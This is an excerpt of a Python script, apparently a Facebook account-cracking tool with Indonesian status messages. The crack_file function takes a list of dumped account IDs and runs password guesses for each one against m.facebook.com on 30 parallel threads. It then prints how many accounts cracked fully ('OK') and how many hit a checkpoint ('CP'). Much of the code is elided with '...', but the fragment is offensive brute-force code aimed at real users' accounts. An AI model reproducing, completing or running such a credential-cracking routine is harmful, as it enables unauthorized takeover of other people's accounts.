...
def crack_file():
	...
	print(f'\r [{hh}<{P}] total JAHID akun adalah {len(dump)}')
	atur_atur()
	...
	with tred(max_workers=30) as babas:
		for akun in id:
			...
			if 'mobile' in metode:
				...
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<{P}] crack telah selesai JAHID OK:{ok} JAHID CP:{cp} ')
